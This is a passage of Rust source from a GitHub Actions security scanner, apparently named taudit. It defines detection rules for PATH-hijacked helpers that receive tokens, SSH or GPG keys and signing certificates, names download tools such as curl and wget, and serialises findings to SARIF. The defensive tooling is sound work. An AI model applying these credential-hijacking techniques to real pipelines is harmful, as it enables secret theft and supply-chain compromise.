             Latin `a`, U+2215 DIVISION SLASH for `/`). When a developer copies the \
             confusable reference it appears identical to the real action. Replace the \
             reference with the genuine ASCII action name.",
        default_level: "error",
        security_severity: "9.0",
        tags: &["security", "supply-chain", "github-actions"],
    },
    RuleDef {
        id: "gha_helper_path_sensitive_argv",
        name: "GhaHelperPathSensitiveArgv",
        short_description: "PATH-selected GHA helper receives sensitive argv.",
        full_description:
            "A prior same-job step mutates GITHUB_PATH before a known helper-delegating \
             GitHub Action passes sensitive material to a bare helper through process \
             arguments. Resolve the helper to a trusted absolute path before credentials \
             are materialized.",
        default_level: "error",
        security_severity: "7.8",
        tags: &["security", "credentials", "github-actions"],
    },
    RuleDef {
        id: "gha_helper_path_sensitive_stdin",
        name: "GhaHelperPathSensitiveStdin",
        short_description: "PATH-selected GHA helper receives sensitive stdin.",
        full_description:
            "A prior same-job step mutates GITHUB_PATH before a known helper-delegating \
             GitHub Action pipes secret material to a bare helper over stdin. Keep the \
             stdin handoff, but ensure it targets a trusted absolute helper path.",
        default_level: "error",
        security_severity: "7.8",
        tags: &["security", "credentials", "github-actions"],
    },
    RuleDef {
        id: "gha_helper_path_sensitive_env",
        name: "GhaHelperPathSensitiveEnv",
        short_description: "PATH-selected GHA helper inherits sensitive env.",
        full_description:
            "A prior same-job step mutates GITHUB_PATH before a known helper-delegating \
             GitHub Action invokes a bare helper while sensitive environment authority is \
             in scope. Validate the resolved helper path and reduce inherited env.",
        default_level: "error",
        security_severity: "7.4",
        tags: &["security", "credentials", "github-actions"],
    },
    RuleDef {
        id: "gha_post_ambient_env_cleanup_path",
        name: "GhaPostAmbientEnvCleanupPath",
        short_description: "GHA post cleanup can be retargeted by later env writes.",
        full_description:
            "A known GitHub Action post hook recomputes cleanup paths from ambient \
             environment and a later same-job step writes to GITHUB_ENV. Store cleanup \
             targets in GITHUB_STATE/core.saveState instead of ambient env.",
        default_level: "warning",
        security_severity: "5.8",
        tags: &["security", "cleanup", "github-actions"],
    },
    RuleDef {
        id: "gha_action_minted_secret_to_helper",
        name: "GhaActionMintedSecretToHelper",
        short_description: "GHA action mints a credential then hands it to PATH helper.",
        full_description:
            "A known GitHub Action mints or exchanges credentials and then delegates the \
             resulting authority to a helper selected through mutable PATH. Resolve helper \
             paths before minting credentials or reject workspace/temp helpers.",
        default_level: "error",
        security_severity: "8.0",
        tags: &["security", "credentials", "github-actions"],
    },
    RuleDef {
        id: "gha_helper_untrusted_path_resolution",
        name: "GhaHelperUntrustedPathResolution",
        short_description: "GHA action resolves a sensitive helper after GITHUB_PATH mutation.",
        full_description:
            "A prior same-job step mutates GITHUB_PATH before a known action invokes a \
             security-sensitive helper by bare name. Pin helper execution to a trusted \
             absolute path or move the PATH mutation into a separate job.",
        default_level: "warning",
        security_severity: "6.2",
        tags: &["security", "supply-chain", "github-actions"],
    },
    RuleDef {
        id: "gha_secret_output_after_helper_login",
        name: "GhaSecretOutputAfterHelperLogin",
        short_description: "GHA login action exposes helper credentials as outputs.",
        full_description:
            "A known login action is configured to expose credential material as step \
             outputs after helper login. Keep masking enabled and avoid forwarding login \
             credentials through step or job outputs.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "credentials", "github-actions"],
    },
    RuleDef {
        id: "later_secret_materialized_after_path_mutation",
        name: "LaterSecretMaterializedAfterPathMutation",
        short_description: "Later action authority reaches helper after earlier PATH mutation.",
        full_description:
            "An earlier same-job step mutates GITHUB_PATH, then a later known helper \
             action receives or mints sensitive authority and resolves a bare helper \
             through PATH. This is the normalized authority-edge classifier that keeps \
             generic PATH edits from becoming findings unless later authority reaches \
             the selected helper.",
        default_level: "error",
        security_severity: "7.8",
        tags: &["security", "credentials", "github-actions"],
    },
    RuleDef {
        id: "gha_setup_node_cache_helper_path_handoff",
        name: "GhaSetupNodeCacheHelperPathHandoff",
        short_description: "setup-node cache discovery resolves package-manager helpers after PATH mutation.",
        full_description:
            "actions/setup-node cache discovery invokes npm, pnpm, or yarn helpers through \
             PATH. When an earlier same-job step mutates GITHUB_PATH, the cache helper \
             selection becomes a useful authority-confusion lead rather than a generic \
             PATH warning.",
        default_level: "warning",
        security_severity: "5.8",
        tags: &["security", "cache", "github-actions"],
    },
    RuleDef {
        id: "gha_setup_python_cache_helper_path_handoff",
        name: "GhaSetupPythonCacheHelperPathHandoff",
        short_description: "setup-python cache discovery resolves pip/poetry helpers after PATH mutation.",
        full_description:
            "actions/setup-python cache modes for pip and poetry invoke package-manager \
             helpers through PATH. When an earlier same-job step mutates GITHUB_PATH, \
             the cache discovery boundary becomes a source lead for helper-resolution \
             authority review.",
        default_level: "warning",
        security_severity: "5.8",
        tags: &["security", "cache", "github-actions"],
    },
    RuleDef {
        id: "gha_setup_python_pip_install_authority_env",
        name: "GhaSetupPythonPipInstallAuthorityEnv",
        short_description: "setup-python pip-install mode inherits ambient authority.",
        full_description:
            "actions/setup-python pip-install mode invokes python -m pip install while the \
             job has token, package-index, cloud, or identity authority in scope. Treat \
             this as a hardening lead for explicit environment allowlisting around \
             package installation.",
        default_level: "warning",
        security_severity: "5.4",
        tags: &["security", "credentials", "github-actions"],
    },
    RuleDef {
        id: "gha_docker_setup_qemu_privileged_docker_helper",
        name: "GhaDockerSetupQemuPrivilegedDockerHelper",
        short_description: "setup-qemu runs privileged Docker helper after registry authority.",
        full_description:
            "docker/setup-qemu-action delegates to Docker helper operations including \
             privileged container execution. The rule fires when earlier registry login \
             or private image context exists and an earlier GITHUB_PATH mutation may \
             influence Docker helper resolution.",
        default_level: "error",
        security_severity: "7.2",
        tags: &["security", "docker", "github-actions"],
    },
    RuleDef {
        id: "gha_setup_go_cache_helper_path_handoff",
        name: "GhaSetupGoCacheHelperPathHandoff",
        short_description:
            "setup-go cache discovery resolves Go helpers after PATH mutation.",
        full_description:
            "actions/setup-go cache discovery can invoke Go helper commands through \
             PATH. When an earlier same-job step mutates GITHUB_PATH and cache mode is \
             explicit, the cache boundary becomes a source lead for helper-resolution \
             authority review.",
        default_level: "warning",
        security_severity: "5.0",
        tags: &["security", "cache", "github-actions"],
    },
    RuleDef {
        id: "gha_tool_installer_then_shell_helper_authority",
        name: "GhaToolInstallerThenShellHelperAuthority",
        short_description: "Installed helper is later used from shell with deploy/signing authority.",
        full_description:
            "A tool installer such as setup-helm, setup-kubectl, or cosign-installer is \
             followed by workflow-authored shell use of that helper while deploy, \
             Kubernetes, registry, signing, token, or cloud authority is in scope. This \
             is an advisory workflow-shell classifier unless source or witness evidence \
             identifies an action-owned helper boundary.",
        default_level: "warning",
        security_severity: "5.2",
        tags: &["security", "workflow-shell", "github-actions"],
    },
    RuleDef {
        id: "gha_workflow_shell_authority_concentration",
        name: "GhaWorkflowShellAuthorityConcentration",
        short_description: "Workflow shell step concentrates publish, deploy, signing, or release authority.",
        full_description:
            "A workflow-authored shell step invokes a known authority-bearing sink such \
             as docker push, npm publish, twine upload, terraform apply/output, helm \
             push, kubectl remote apply, cosign sign/attest, gh release, or cargo \
             publish while token, cloud, registry, package, or signing authority is in \
             scope. This is a corpus and hardening classifier, not a vulnerability claim.",
        default_level: "warning",
        security_severity: "5.0",
        tags: &["security", "workflow-shell", "github-actions"],
    },
    RuleDef {
        id: "gha_action_token_env_before_bare_download_helper",
        name: "GhaActionTokenEnvBeforeBareDownloadHelper",
        short_description: "Token-bearing action resolves download helpers after PATH mutation.",
        full_description:
            "A reviewed upload/release action receives token authority after an earlier \
             same-job GITHUB_PATH mutation and invokes bare download or verification \
             helpers such as curl, wget, gpg, or checksum tools. Treat this as an \
             authority-boundary lead unless source or witness evidence upgrades it.",
        default_level: "error",
        security_severity: "7.0",
        tags: &["security", "credentials", "github-actions"],
    },
    RuleDef {
        id: "gha_post_action_input_retarget_to_cache_save",
        name: "GhaPostActionInputRetargetToCacheSave",
        short_description: "Cache post-save boundary can be retargeted by later env mutation.",
        full_description:
            "An actions/cache restore/save boundary is followed by same-job environment \
             mutation of cache path, key, or INPUT_-style variables. This flags a \
             post-action retargeting lead, not a vulnerability claim.",
        default_level: "warning",
        security_severity: "5.2",
        tags: &["security", "cache", "github-actions"],
    },
    RuleDef {
        id: "gha_terraform_wrapper_sensitive_output",
        name: "GhaTerraformWrapperSensitiveOutput",
        short_description: "Terraform wrapper stdout/stderr outputs are consumed later.",
        full_description:
            "hashicorp/setup-terraform wrapper mode captures Terraform stdout/stderr as \
             step outputs. A later step consuming those outputs can accidentally move \
             sensitive plan or output material across the workflow.",
        default_level: "warning",
        security_severity: "5.4",
        tags: &["security", "credentials", "github-actions"],
    },
    RuleDef {
        id: "gha_composite_bare_helper_after_path_install_with_secret_env",
        name: "GhaCompositeBareHelperAfterPathInstallWithSecretEnv",
        short_description: "Bare helper runs after PATH mutation with secret env authority.",
        full_description:
            "A workflow or composite-style shell step invokes bare package, deploy, \
             signing, cloud, or release helpers after earlier GITHUB_PATH mutation while \
             secret authority is in scope. This is a deterministic hardening classifier.",
        default_level: "warning",
        security_severity: "5.6",
        tags: &["security", "workflow-shell", "github-actions"],
    },
    RuleDef {
        id: "gha_pulumi_path_resolved_cli_with_authority",
        name: "GhaPulumiPathResolvedCliWithAuthority",
        short_description: "Pulumi authority reaches PATH-resolved CLI helper.",
        full_description:
            "pulumi/actions receives Pulumi token, cloud, or stack authority after an \
             earlier same-job GITHUB_PATH mutation and delegates to a PATH-resolved \
             pulumi helper.",
        default_level: "error",
        security_severity: "7.4",
        tags: &["security", "credentials", "github-actions"],
    },
    RuleDef {
        id: "gha_pypi_publish_oidc_after_path_mutation",
        name: "GhaPypiPublishOidcAfterPathMutation",
        short_description: "PyPI publish/OIDC authority follows PATH mutation.",
        full_description:
            "pypa/gh-action-pypi-publish receives PyPI token or trusted-publishing \
             OIDC authority after an earlier same-job GITHUB_PATH mutation and reaches \
             Python packaging helper resolution.",
        default_level: "error",
        security_severity: "7.4",
        tags: &["security", "credentials", "github-actions"],
    },
    RuleDef {
        id: "gha_changesets_publish_command_with_authority",
        name: "GhaChangesetsPublishCommandWithAuthority",
        short_description: "Changesets publish command runs after PATH mutation with package authority.",
        full_description:
            "changesets/action has a publish command and package/GitHub token authority \
             after an earlier same-job GITHUB_PATH mutation. The action may delegate to \
             npm, pnpm, or yarn helpers selected through PATH.",
        default_level: "error",
        security_severity: "7.2",
        tags: &["security", "credentials", "github-actions"],
    },
    RuleDef {
        id: "gha_rubygems_release_git_token_and_oidc_helper",
        name: "GhaRubygemsReleaseGitTokenAndOidcHelper",
        short_description: "RubyGems release authority reaches PATH helpers.",
        full_description:
            "rubygems/release-gem receives RubyGems token, GitHub token, or OIDC release \
             authority after an earlier same-job GITHUB_PATH mutation and can delegate \
             to gem, bundle, or git helpers.",
        default_level: "error",
        security_severity: "7.2",
        tags: &["security", "credentials", "github-actions"],
    },
    RuleDef {
        id: "gha_composite_entrypoint_path_shadow_with_secret_env",
        name: "GhaCompositeEntrypointPathShadowWithSecretEnv",
        short_description: "Local/composite action runs after PATH mutation with secret env.",
        full_description:
            "A local/composite action reference runs after an earlier same-job GITHUB_PATH \
             mutation while secret authority is directly attached to the action step. \
             taudit does not inline local action internals, so this is emitted as a \
             review lead for entrypoint and helper resolution.",
        default_level: "warning",
        security_severity: "5.6",
        tags: &["security", "workflow-shell", "github-actions"],
    },
    RuleDef {
        id: "gha_docker_buildx_authority_path_handoff",
        name: "GhaDockerBuildxAuthorityPathHandoff",
        short_description: "Docker Buildx authority reaches helpers after PATH mutation.",
        full_description:
            "docker/build-push-action or docker/setup-buildx-action runs after an \
             earlier same-job GITHUB_PATH mutation while registry, SSH, build-secret, \
             or publish authority is in scope. Treat this as a Docker helper-boundary \
             authority lead.",
        default_level: "error",
        security_severity: "7.2",
        tags: &["security", "docker", "github-actions"],
    },
    RuleDef {
        id: "gha_google_deploy_gcloud_credential_path",
        name: "GhaGoogleDeployGcloudCredentialPath",
        short_description: "Google deploy credential reaches PATH-resolved gcloud.",
        full_description:
            "Google deploy actions for App Engine or Cloud Run run after earlier \
             same-job GITHUB_PATH mutation while Google deploy credentials, ADC, OIDC, \
             or service-account authority is present, then delegate to gcloud.",
        default_level: "error",
        security_severity: "7.6",
        tags: &["security", "credentials", "github-actions"],
    },
    RuleDef {
        id: "gha_datadog_test_visibility_installer_authority",
        name: "GhaDatadogTestVisibilityInstallerAuthority",
        short_description: "Datadog test visibility helper runs with API key authority.",
        full_description:
            "datadog/test-visibility-github-action runs after earlier same-job \
             GITHUB_PATH mutation while Datadog API key or test visibility upload \
             authority is present around installer/runtime helper resolution.",
        default_level: "warning",
        security_severity: "5.8",
        tags: &["security", "credentials", "github-actions"],
    },
    RuleDef {
        id: "gha_kubernetes_helper_kubeconfig_authority",
        name: "GhaKubernetesHelperKubeconfigAuthority",
        short_description: "Kubernetes helpers run with kubeconfig authority after PATH mutation.",
        full_description:
            "A workflow shell step invokes kubectl or helm deploy helpers after earlier \
             same-job GITHUB_PATH mutation while kubeconfig or cluster deploy authority \
             is present. This identifies Kubernetes helper-resolution authority leads.",
        default_level: "error",
        security_severity: "7.2",
        tags: &["security", "kubernetes", "github-actions"],
    },
    RuleDef {
        id: "gha_azure_companion_helper_authority",
        name: "GhaAzureCompanionHelperAuthority",
        short_description: "Azure companion helpers run after PATH mutation with cloud authority.",
        full_description:
            "A workflow shell step invokes Azure companion helpers such as sqlcmd, \
             SqlPackage, kubelogin, pwsh, or powershell after earlier same-job \
             GITHUB_PATH mutation and after Azure login or cloud authority is present.",
        default_level: "error",
        security_severity: "7.2",
        tags: &["security", "azure", "github-actions"],
    },
    RuleDef {
        id: "gha_create_pr_git_token_path_handoff",
        name: "GhaCreatePrGitTokenPathHandoff",
        short_description:
            "create-pull-request delegates token authority to PATH-selected git.",
        full_description:
            "peter-evans/create-pull-request receives GitHub/App token authority or \
             write-scoped repository permissions after an earlier same-job GITHUB_PATH \
             mutation, then delegates repository mutation to a git helper selected \
             through PATH. Treat this as an action-boundary authority lead.",
        default_level: "error",
        security_severity: "7.8",
        tags: &["security", "credentials", "github-actions"],
    },
    RuleDef {
        id: "gha_import_gpg_private_key_helper_path",
        name: "GhaImportGpgPrivateKeyHelperPath",
        short_description: "GPG import action delegates key material to PATH helpers.",
        full_description:
            "crazy-max/ghaction-import-gpg receives GPG private key or passphrase \
             material after an earlier same-job GITHUB_PATH mutation, then invokes \
             gpg or gpg-connect-agent by helper name. Resolve signing helpers to \
             trusted paths before private key material is present.",
        default_level: "error",
        security_severity: "7.8",
        tags: &["security", "credentials", "github-actions"],
    },
    RuleDef {
        id: "gha_ssh_agent_private_key_to_path_helper",
        name: "GhaSshAgentPrivateKeyToPathHelper",
        short_description: "SSH agent action delegates private key material to PATH helpers.",
        full_description:
            "webfactory/ssh-agent receives SSH private key material after an earlier \
             same-job GITHUB_PATH mutation, then invokes ssh-agent or ssh-add through \
             PATH. Ensure SSH helpers resolve to trusted runner paths before key \
             material reaches stdin or agent state.",
        default_level: "error",
        security_severity: "7.8",
        tags: &["security", "credentials", "github-actions"],
    },
    RuleDef {
        id: "gha_macos_codesign_cert_security_path",
        name: "GhaMacosCodesignCertSecurityPath",
        short_description: "macOS codesign import delegates certificate authority to security.",
        full_description:
            "apple-actions/import-codesign-certs receives P12, certificate password, or \
             keychain authority after an earlier same-job GITHUB_PATH mutation, then \
             delegates to the macOS security helper. Resolve security through a trusted \
             absolute path before certificate material is available.",
        default_level: "error",
        security_severity: "7.8",
        tags: &["security", "credentials", "github-actions"],
    },
    RuleDef {
        id: "gha_pages_deploy_token_url_to_git_helper",
        name: "GhaPagesDeployTokenUrlToGitHelper",
        short_description: "Pages deploy action delegates token URL authority to git.",
        full_description:
            "Pages deploy actions such as peaceiris/actions-gh-pages or \
             JamesIves/github-pages-deploy-action receive GitHub token, PAT, or deploy \
             key authority after an earlier same-job GITHUB_PATH mutation, then compose \
             Git push authority for a PATH-selected git helper.",
        default_level: "error",
        security_severity: "7.6",
        tags: &["security", "credentials", "github-actions"],
    },
    RuleDef {
        id: "gha_toolcache_absolute_path_downgrade",
        name: "GhaToolcacheAbsolutePathDowngrade",
        short_description: "Precision guard for toolcache absolute helper execution.",
        full_description:
            "Precision guard for GitHub Actions that install helpers into the runner \
             toolcache and invoke an absolute path. This rule id documents the negative \
             control used to avoid helper-PATH false positives.",
        default_level: "note",
        security_severity: "0.0",
        tags: &["security", "precision", "github-actions"],
    },
];

// ── SARIF 2.1.0 schema structs ──────────────────────────

#[derive(Serialize)]
struct SarifLog {
    #[serde(rename = "$schema")]
    schema: &'static str,
    version: &'static str,
    runs: Vec<SarifRun>,
}

#[derive(Serialize)]
struct SarifRun {
    tool: SarifTool,
    results: Vec<SarifResult>,
}

#[derive(Serialize)]
struct SarifTool {
    driver: SarifDriver,
}

#[derive(Serialize)]
struct SarifDriver {
    name: &'static str,
    version: String,
    #[serde(rename = "informationUri")]
    information_uri: &'static str,
    rules: Vec<SarifRule>,
}

#[derive(Serialize)]
struct SarifRule {
    id: String,
    name: String,
    #[serde(rename = "shortDescription")]
    short_description: SarifMessage,
    #[serde(rename = "fullDescription")]
    full_description: SarifMessage,
    #[serde(rename = "defaultConfiguration")]
    default_configuration: SarifDefaultConfiguration,
    #[serde(rename = "helpUri")]
    help_uri: String,
    properties: SarifRuleProperties,
}

#[derive(Serialize)]
struct SarifDefaultConfiguration {
    level: String,
}

#[derive(Serialize)]
struct SarifRuleProperties {
    #[serde(rename = "security-severity")]
    security_severity: String,
    tags: Vec<String>,
}

#[derive(Serialize, Clone)]
struct SarifMessage {
    text: String,
}

#[derive(Serialize)]
struct SarifResult {
    #[serde(rename = "ruleId")]
    rule_id: String,
    level: &'static str,
    message: SarifMessage,
    locations: Vec<SarifLocation>,
    properties: SarifResultProperties,
    #[serde(rename = "partialFingerprints")]
    partial_fingerprints: SarifPartialFingerprints,
}

#[derive(Serialize)]
struct SarifResultProperties {
    #[serde(rename = "security-severity")]
    security_severity: &'static str,
    /// Provenance label distinguishing built-in findings from those emitted
    /// by custom invariant YAML loaded via `--invariants-dir`. SIEMs and
    /// triage tooling should treat any non-`built-in` value as
    /// untrusted-by-default — anyone with write access to the invariants
    /// directory can otherwise emit arbitrarily-worded CRITICAL findings
    /// indistinguishable from authentic ones. Format: literal `built-in`
    /// for shipped rules, `custom:<source-file-path>` for custom invariants.
    #[serde(rename = "taudit-source")]
    taudit_source: String,
    /// Stable UUID v5 grouping per `(rule, file, root authority)` cluster.
    /// SARIF viewers (GitHub Code Scanning, VS Code) expose `properties.*`
    /// as raw key/value pairs, so this field is consumable directly.
    /// See `docs/finding-output-enhancements.md`.
    #[serde(rename = "findingGroupId", skip_serializing_if = "Option::is_none")]
    finding_group_id: Option<String>,
    /// Operator-stable waiver key. Coarser than `partialFingerprints` and
    /// intended for `.taudit-suppressions.yml` entries that should survive
    /// unrelated surrounding workflow edits.
    #[serde(rename = "suppressionKey")]
    suppression_key: String,
    /// Coarse remediation effort: trivial / small / medium / large.
    /// Triage dashboards sort by `severity * timeToFix` to surface the
    /// highest-ROI fixes. See `docs/finding-output-enhancements.md`.
    #[serde(rename = "timeToFix", skip_serializing_if = "Option::is_none")]
    time_to_fix: Option<&'static str>,
    /// Detected compensating controls that downgraded this finding's
    /// severity. Empty list serializes nothing. See blueteam corpus
    /// defense report Section 4.
    #[serde(rename = "compensatingControls", skip_serializing_if = "Vec::is_empty")]
    compensating_controls: Vec<String>,
    /// SARIF 2.1.0 also defines top-level `result.suppressions`. The current
    /// public taudit projection keeps suppression state in `properties` so
    /// consumers can read one taudit-owned object consistently across sinks.
    #[serde(rename = "suppressed", skip_serializing_if = "is_false_ref")]
    suppressed: bool,
    /// Pre-downgrade severity when the suppression applicator OR a
    /// compensating control modified `level`. Useful for dashboards that
    /// want to render "downgraded from Critical" badges.
    #[serde(rename = "originalSeverity", skip_serializing_if = "Option::is_none")]
    original_severity: Option<&'static str>,
    /// Operator-supplied public suppression justification. It is projected
    /// only when a suppression matched and the reason exists in the finding.
    #[serde(rename = "suppressionReason", skip_serializing_if = "Option::is_none")]
    suppression_reason: Option<String>,
    /// Confidence boundary for the finding, currently `yaml_only` for
    /// built-in static analysis findings.
    #[serde(rename = "confidenceScope", skip_serializing_if = "Option::is_none")]
    confidence_scope: Option<String>,
    /// Runtime or provider-side preconditions that must be verified before
    /// claiming live exploitability from the static SARIF result.
    #[serde(rename = "runtimePreconditions", skip_serializing_if = "Vec::is_empty")]
    runtime_preconditions: Vec<String>,
    /// True when exploitability depends on provider control-plane settings
    /// outside the scanned YAML artifact.
    #[serde(
        rename = "portalControlDependency",
        skip_serializing_if = "is_false_ref"
    )]
    portal_control_dependency: bool,
    /// Coarse authority kinds involved in the result.
    #[serde(rename = "authorityKinds", skip_serializing_if = "Vec::is_empty")]
    authority_kinds: Vec<String>,
    /// Coarse attacker-influenced surfaces involved in the result.
    #[serde(rename = "attackerSurfaceKinds", skip_serializing_if = "Vec::is_empty")]
    attacker_surface_kinds: Vec<String>,
    /// Resolution strength for template/reusable-workflow delegation results.
    #[serde(
        rename = "templateResolutionStrength",
        skip_serializing_if = "Option::is_none"
    )]
    template_resolution_strength: Option<String>,
    /// Relationship to cited CVE/advisory classes.
    #[serde(rename = "cveRelationship", skip_serializing_if = "Option::is_none")]
    cve_relationship: Option<String>,
}

#[allow(clippy::trivially_copy_pass_by_ref)]
fn is_false_ref(b: &bool) -> bool {
    !*b
}

fn fix_effort_to_str(e: FixEffort) -> &'static str {
    match e {
        FixEffort::Trivial => "trivial",
        FixEffort::Small => "small",
        FixEffort::Medium => "medium",
        FixEffort::Large => "large",
    }
}

fn severity_to_str(s: Severity) -> &'static str {
    match s {
        Severity::Critical => "critical",
        Severity::High => "high",
        Severity::Medium => "medium",
        Severity::Low => "low",
        Severity::Info => "info",
    }
}

#[derive(Serialize)]
struct SarifPartialFingerprints {
    /// SARIF-canonical key. GitHub Code Scanning's baseline-mapping
    /// algorithm checks this first to decide "same finding as last run?".
    /// Preserves UI-side state (suppressions, dismissals) across re-runs.
    #[serde(rename = "primaryLocationLineHash")]
    primary_location_line_hash: String,
    /// Tool-namespaced, version-tagged handle. Byte-identical to
    /// `primaryLocationLineHash` today; the version suffix lets a future
    /// fingerprint-formula bump (v2) signal "old suppressions don't carry
    /// over" via key change rather than a silent value change. Recommended
    /// handle for SIEMs and external suppression DBs that aren't bound to
    /// SARIF's specific baseline-mapping semantics.
    /// See `docs/finding-fingerprint.md` § "SARIF baseline integration".
    #[serde(rename = "taudit/v1")]
    taudit_v1: String,
}

#[derive(Serialize)]
struct SarifLocation {
    #[serde(rename = "physicalLocation")]
    physical_location: SarifPhysicalLocation,
}

#[derive(Serialize)]
struct SarifPhysicalLocation {
    #[serde(rename = "artifactLocation")]
    artifact_location: SarifArtifactLocation,
}

#[derive(Serialize)]
struct SarifArtifactLocation {
    uri: String,
    #[serde(rename = "uriBaseId")]
    uri_base_id: &'static str,
}

// ── Adapter ─────────────────────────────────────────────

pub struct SarifReportSink;

impl SarifReportSink {
    /// Emit a single SARIF 2.1.0 document aggregating findings from multiple
    /// pipeline files. All results land in one `runs[0]` entry so downstream
    /// consumers (sarif-tools, jq, VS Code) see a valid top-level JSON object.
    pub fn emit_multi<W: std::io::Write>(
        &self,
        w: &mut W,
        items: &[(&AuthorityGraph, &[Finding])],
    ) -> Result<(), TauditError> {
        self.emit_multi_with_custom_rules(w, items, &[])
    }

    /// Like `emit_multi` but also injects entries for custom (user-defined)
    /// rules into the SARIF driver's `rules` array. SARIF requires every
    /// `result.ruleId` to resolve against a `rules[]` entry — without this
    /// step custom rules would surface as "unknown rule" in viewers.
    pub fn emit_multi_with_custom_rules<W: std::io::Write>(
        &self,
        w: &mut W,
        items: &[(&AuthorityGraph, &[Finding])],
        custom_rules: &[CustomRule],
    ) -> Result<(), TauditError> {
        // No caller-supplied product version: fall back to this crate's
        // version. The CLI passes its own (product) version instead, so the
        // SARIF `tool.driver.version` matches `taudit --version`.
        self.emit_multi_with_custom_rules_versioned(
            w,
            items,
            custom_rules,
            env!("CARGO_PKG_VERSION"),
        )
    }

    /// Like [`emit_multi_with_custom_rules`] but stamps the SARIF
    /// `tool.driver.version` with the caller-supplied product version. The
    /// `taudit` CLI passes `env!("CARGO_PKG_VERSION")` from its own crate so
    /// the emitted evidence reports the same version users see from
    /// `taudit --version`, rather than this report crate's independent semver.
    pub fn emit_multi_with_custom_rules_versioned<W: std::io::Write>(
        &self,
        w: &mut W,
        items: &[(&AuthorityGraph, &[Finding])],
        custom_rules: &[CustomRule],
        tool_version: &str,
    ) -> Result<(), TauditError> {
        let mut rules = build_rules();
        rules.extend(build_custom_rules(custom_rules));
        let custom_ids: std::collections::HashSet<&str> =
            custom_rules.iter().map(|r| r.id.as_str()).collect();
        let results: Vec<SarifResult> = items
            .iter()
            .flat_map(|(graph, findings)| {
                findings
                    .iter()
                    .map(|f| finding_to_result(f, &graph.source.file, graph, &custom_ids))
            })
            .collect();

        let log = SarifLog {
            schema: SARIF_SCHEMA,
            version: SARIF_VERSION,
            runs: vec![SarifRun {
                tool: SarifTool {
                    driver: SarifDriver {
                        name: TOOL_NAME,
                        version: tool_version.to_string(),
                        information_uri: TOOL_URI,
                        rules,
                    },
                },
                results,
            }],
        };

        serde_json::to_writer_pretty(w, &log)
            .map_err(|e| TauditError::Report(format!("SARIF serialization error: {e}")))?;

        Ok(())
    }
}

impl<W: std::io::Write> ReportSink<W> for SarifReportSink {
    fn emit(
        &self,
        w: &mut W,
        graph: &AuthorityGraph,
        findings: &[Finding],
    ) -> Result<(), TauditError> {
        self.emit_multi(w, &[(graph, findings)])
    }
}

fn build_rules() -> Vec<SarifRule> {
    RULE_DEFS
        .iter()
        .map(|r| SarifRule {
            id: r.id.to_string(),
            name: r.name.to_string(),
            short_description: SarifMessage {
                text: r.short_description.to_string(),
            },
            full_description: SarifMessage {
                text: r.full_description.to_string(),
            },
            default_configuration: SarifDefaultConfiguration {
                level: r.default_level.to_string(),
            },
            help_uri: format!("{RULES_BASE_URI}/{}", r.id),
            properties: SarifRuleProperties {
                security_severity: r.security_severity.to_string(),
                tags: r.tags.iter().map(|t| (*t).to_string()).collect(),
            },
        })
        .collect()
}

fn build_custom_rules(rules: &[CustomRule]) -> Vec<SarifRule> {
    rules
        .iter()
        .map(|r| {
            let level = match r.severity {
                Severity::Critical | Severity::High => "error",
                Severity::Medium => "warning",
                Severity::Low | Severity::Info => "note",
            };
            let security_severity = match r.severity {
                Severity::Critical => "9.0",
                Severity::High => "7.5",
                Severity::Medium => "5.0",
                Severity::Low => "2.0",
                Severity::Info => "0.1",
            };
            // SECURITY: every field below — `r.id`, `r.name`, `r.description`
            // — is sourced from custom-rule YAML loaded via
            // `--invariants-dir`. An attacker who can land a custom-rule
            // file (or convince an operator to apply one from a hostile
            // source) controls every byte of these strings. The built-in
            // catalogue (`RULE_DEFS` above) is author-controlled and uses
            // intentional Markdown — those descriptors are NOT escaped.
            // Custom rules are escaped unconditionally.
            let short_raw = if r.description.is_empty() {
                r.name.clone()
            } else {
                r.description.clone()
            };
            let short = escape_markdown(&short_raw).into_owned();
            let name = escape_markdown(&r.name).into_owned();
            // `r.id` is constrained to snake_case + kebab-case + digits at
            // deserialise time (see `taudit-core/src/custom_rules.rs`
            // ID_CHARSET_DESC) — letters/digits/`_`/`-` only. Markdown
            // escaping `-` would break SARIF rule cross-reference (the
            // result's `ruleId` matches descriptor `id` by string equality
            // and is computed from the RAW finding message via
            // `rule_id_for`). We rely on the deserialiser charset gate as
            // the security boundary and emit the id verbatim.
            SarifRule {
                id: r.id.clone(),
                name,
                short_description: SarifMessage {
                    text: short.clone(),
                },
                full_description: SarifMessage { text: short },
                default_configuration: SarifDefaultConfiguration {
                    level: level.to_string(),
                },
                help_uri: format!("{RULES_BASE_URI}/{}", r.id),
                properties: SarifRuleProperties {
                    security_severity: security_severity.to_string(),
                    tags: vec!["security".to_string(), "custom-rule".to_string()],
                },
            }
        })
        .collect()
}

/// Map a `Finding` to a SARIF `result` object. Custom-rule findings carry
/// their rule id in the message as `[<id>] ...`; the rule-id resolver
/// shared with JSON, baseline, and CloudEvents lifts the custom id when
/// the bracketed token is a valid snake_case identifier. Unlike the
/// pre-v1.1 SARIF emitter, custom ids are NOT filtered through
/// `custom_ids.contains(...)` — JSON does not filter either, and silent
/// re-categorisation is worse than a SARIF viewer rendering "unknown
/// rule" for an unregistered custom rule. The two emitters now agree.
fn finding_to_result(
    finding: &Finding,
    source_file: &str,
    graph: &AuthorityGraph,
    _custom_ids: &std::collections::HashSet<&str>,
) -> SarifResult {
    let rule_id = rule_id_for(finding);
    let level = severity_to_level(&finding.severity);
    let security_severity = severity_to_security_severity(&finding.severity);

    let uri = source_file.to_string();

    // Single source of truth for the fingerprint lives in
    // `taudit_core::finding::compute_fingerprint`. Same value also surfaces
    // in the JSON report (`findings[].fingerprint`) and the CloudEvents
    // sink (`tauditfindingfingerprint` extension attribute) so SIEMs can
    // dedup across formats. See `docs/finding-fingerprint.md`.
    let fingerprint = compute_fingerprint(finding, graph);
    let suppression_key = compute_suppression_key(finding, graph);

    let taudit_source = match &finding.source {
        FindingSource::BuiltIn => "built-in".to_string(),
        FindingSource::Custom { source_file } => {
            format!("custom:{}", source_file.display())
        }
    };
    let finding_group_id = finding
        .extras
        .finding_group_id
        .clone()
        .or_else(|| Some(compute_finding_group_id(&fingerprint)));
    let time_to_fix = finding.extras.time_to_fix.map(fix_effort_to_str);
    let compensating_controls = finding.extras.compensating_controls.clone();
    let suppressed = finding.extras.suppressed;
    let original_severity = finding.extras.original_severity.map(severity_to_str);
    let suppression_reason = finding.extras.suppression_reason.clone();
    let confidence_scope = finding.extras.confidence_scope.clone();
    let runtime_preconditions = finding.extras.runtime_preconditions.clone();
